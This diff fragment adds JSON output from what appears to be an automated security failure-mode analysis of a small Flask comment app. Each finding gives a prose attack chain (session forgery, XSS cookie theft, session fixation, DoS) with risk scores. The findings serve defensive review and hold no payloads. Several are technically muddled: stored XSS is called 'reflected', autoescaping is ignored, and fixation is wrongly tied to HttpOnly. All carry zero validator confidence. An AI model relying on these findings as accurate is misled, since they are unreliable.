+              "blast_radius": "All sessions (including admin) can be forged; full control over Tier 1 data (comments) and admin functions. May enable persistent access if SECRET_KEY remains unchanged.",
+              "attack_chain": [
+                "Attacker gains access to the SECRET_KEY environment variable (e.g., via env dump, logs, or misconfiguration)",
+                "Attacker uses the SECRET_KEY to forge a valid Flask session cookie with is_admin=True",
+                "Attacker sets the forged cookie in their browser and accesses /admin/moderate (app.py:24)",
+                "The session check (app.py:24) passes, granting admin access without authentication"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 490,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Race condition in comment submission leading to duplicate or corrupted entries",
+              "trigger": "High concurrency of POST /comment requests (e.g., automated bot or script).",
+              "evidence": "app.py:8 ('COMMENTS = []'), app.py:13 ('COMMENTS.append(...)')",
+              "business_impact": "Data integrity compromise in the comment system. May lead to inconsistent user experience, reputational harm, or denial-of-service if the list becomes unusable.",
+              "blast_radius": "All comments (Tier 1 data) may be corrupted or duplicated. No direct auth bypass, but could degrade service.",
+              "attack_chain": [
+                "Attacker sends multiple concurrent POST /comment requests with the same or malformed data (app.py:13)",
+                "The in-memory COMMENTS list (app.py:8) is modified without locking, causing TOCTOU (Time-of-Check-Time-of-Use) or race conditions",
+                "Resulting in duplicate comments, partial writes, or corrupted list state (e.g., mixed author/body fields)"
+              ],
+              "severity": 6,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 270,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Reflected XSS via author field in comments",
+              "trigger": "User visits /comments after attacker posts a comment with malicious 'author' field.",
+              "evidence": "app.py:13 ('COMMENTS.append({\"author\": request.form[\"author\"], ...})'), comments.html:4 ('<b>{{ c.author }}</b>'), app.py:7 ('SESSION_COOKIE_HTTPONLY = False')",
+              "business_impact": "User session hijacking, account takeover, or malicious actions performed on behalf of users. Harms user trust and may lead to data breaches.",
+              "blast_radius": "Affects all users viewing the comments page. If admin views the page, their session can be hijacked (escalating to full admin compromise).",
+              "attack_chain": [
+                "Attacker submits a comment with malicious JavaScript in the 'author' field via POST /comment (app.py:13)",
+                "The author field is rendered unsanitized in comments.html (comments.html:4: '<b>{{ c.author }}</b>')",
+                "When a user views /comments, the script executes in their browser context",
+                "Script can steal cookies (non-HttpOnly, app.py:7) or perform actions on behalf of the user"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "In-memory data loss due to process crash or restart",
+              "trigger": "Flask process crashes, server restarts, or container is recycled (e.g., during deployment or OOM).",
+              "evidence": "app.py:8 ('COMMENTS = []')",
+              "business_impact": "Complete loss of all user-generated content (comments). Harms user experience, business reputation, and may violate data retention policies.",
+              "blast_radius": "All comments (Tier 1 data) are lost. No direct security impact, but operational and reputational damage.",
+              "attack_chain": [
+                "The COMMENTS list is stored in-memory (app.py:8) with no persistence mechanism",
+                "A crash, restart, or OOM kill of the Flask process erases all comments",
+                "No recovery mechanism exists; all user-submitted data is permanently lost"
+              ],
+              "severity": 8,
+              "occurrence": 6,
+              "detection": 5,
+              "rpn": 240,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Session fixation attack via non-HttpOnly cookie",
+              "trigger": "Victim visits a malicious link or page that sets a session cookie before authenticating.",
+              "evidence": "app.py:7 ('SESSION_COOKIE_HTTPONLY = False'), app.py:24 ('session.get(\"is_admin\")')",
+              "business_impact": "Unauthorized access to user or admin sessions. Enables account takeover, data theft, or privilege escalation.",
+              "blast_radius": "Affects all users whose sessions can be fixed. If admin session is fixed, full admin compromise occurs.",
+              "attack_chain": [
+                "Attacker sets a known session cookie value in a victim's browser (e.g., via malicious link or subdomain takeover)",
+                "Victim logs in (if applicable) or interacts with the app, but the session cookie remains the attacker's value due to non-HttpOnly (app.py:7)",
+                "Attacker uses the fixed session cookie to impersonate the victim, accessing their session (e.g., if victim is admin, gains /admin/moderate access)"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial-of-Service via memory exhaustion from unbounded comment storage",
+              "trigger": "Sustained high-volume POST /comment requests (e.g., automated bot or DDoS).",
+              "evidence": "app.py:8 ('COMMENTS = []'), app.py:13 ('COMMENTS.append(...)')",
+              "business_impact": "Service degradation or outage for all users. Harms availability, leading to lost revenue and user trust.",
+              "blast_radius": "Affects the entire application (Tier 1). May cause cascading failures if the app is part of a larger system.",
+              "attack_chain": [
+                "Attacker submits a large number of comments via POST /comment (app.py:13)",
+                "The COMMENTS list (app.py:8) grows indefinitely in memory with no size limits or eviction policy",
+                "Eventually, the process consumes all available memory, causing crashes or slowdowns for all users"
+              ],
+              "severity": 8,
+              "occurrence": 7,
+              "detection": 6,
+              "rpn": 336,
+              "priority": "High",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.181947,
+          "seconds": 118.1,
+          "llm_calls": 21
+        }
+      ]
+    }
+  }
+}
